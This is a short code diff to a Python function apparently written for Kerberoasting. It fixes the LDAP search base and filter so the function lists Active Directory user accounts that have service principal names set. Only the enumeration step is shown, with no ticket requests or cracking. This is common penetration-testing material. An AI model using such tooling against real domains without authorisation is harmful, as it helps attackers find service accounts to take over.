@@ -13,12 +13,12 @@ def kerberoast(username, password, domain, dc_ip):
 
         print(f"Successfully connected to LDAP server {dc_ip}")
 
-        # Use FQDN of the domain controller as search base
-        search_base = f"{dc_ip}"
+        # Use domain name as search base
+        search_base = f"DC={','.join(domain.split('.'))}"
         print(f"Search base: {search_base}")
 
-        # Search for users with SPNs set
-        search_filter = "(servicePrincipalName=*)"
+        # Search for user objects with SPNs set
+        search_filter = "(&(objectClass=user)(servicePrincipalName=*))"
         print(f"Search filter: {search_filter}")
 
         conn.search(search_base=search_base,
@@ -30,8 +30,7 @@ def kerberoast(username, password, domain, dc_ip):
 
         # Extract kerberoastable accounts
         for entry in conn.entries:
-            if entry.entry_attributes_as_dict.get('servicePrincipalName'):
-                kerberoastable_accounts.append(entry.entry_dn)
+            kerberoastable_accounts.append(entry.entry_dn)
 
         conn.unbind()
 
